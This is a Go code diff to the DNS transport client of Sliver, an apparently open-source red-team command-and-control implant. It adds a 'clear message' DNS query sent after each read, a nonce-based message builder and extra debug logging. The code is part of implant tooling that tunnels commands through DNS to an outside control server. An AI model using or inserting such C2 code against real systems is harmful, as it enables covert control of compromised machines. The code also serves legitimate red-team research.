@@ -522,6 +522,27 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	if err != nil && err != cryptography.ErrReplayAttack {
 		return nil, err
 	}
+
+	//Send clear
+	clearMsg, err := s.clearMsg(dnsMsg.ID)
+	if err != nil {
+		return nil, err
+	}
+	domain, err = s.joinSubdataToParent(clearMsg)
+	if err != nil {
+		return nil, err
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] clear msg domain: %v", domain)
+	// {{end}}
+
+	respData, _, err = resolver.A(domain)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] clear msg error: %s", err)
+		// {{end}}
+	}
+
 	envelope := &pb.Envelope{}
 	err = proto.Unmarshal(plaintext, envelope)
 	return envelope, err
@@ -631,6 +652,9 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 	recvData := make(chan []byte)
 	errors := []error{}
 	go func() {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] Manifest Len: %d ", manifest.Size)
+		// {{end}}
 		recvDataBuf := make([]byte, manifest.Size)
 		for result := range results {
 			if result.Err != nil {
@@ -638,7 +662,7 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 				continue
 			}
 			// {{if .Config.Debug}}
-			log.Printf("[dns] read result data: %v", result.Data)
+			log.Printf("[dns] read result data: Len: %d %v", len(result.Data), result.Data)
 			// {{end}}
 			recvMsg := &dnspb.DNSMessage{}
 			err := proto.Unmarshal(result.Data, recvMsg)
@@ -653,6 +677,9 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 			log.Printf("[dns] recv msg: %v", recvMsg)
 			// {{end}}
 			if manifest.Size < recvMsg.Start || int(manifest.Size) < int(recvMsg.Start)+len(recvMsg.Data) {
+				// {{if .Config.Debug}}
+				log.Printf("[dns] invalid index")
+				// {{end}}
 				errors = append(errors, ErrInvalidIndex)
 				continue
 			}
@@ -866,6 +893,21 @@ func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
 	pollMsg, _ := proto.Marshal(&dnspb.DNSMessage{
 		ID:   s.dnsSessionID,
 		Type: dnspb.DNSMessageType_POLL,
+		Data: nonceBuf,
+	})
+	if s.enableCaseSensitiveEncoder {
+		return string(s.base58.Encode(pollMsg)), nil
+	} else {
+		return string(s.base32.Encode(pollMsg)), nil
+	}
+}
+
+func (s *SliverDNSClient) clearMsg(msgId uint32) (string, error) {
+	nonceBuf := make([]byte, 8)
+	rand.Read(nonceBuf)
+	pollMsg, _ := proto.Marshal(&dnspb.DNSMessage{
+		ID:   msgId,
+		Type: dnspb.DNSMessageType_CLEAR,
 		Data: nonceBuf,
 	})
 	if s.enableCaseSensitiveEncoder {
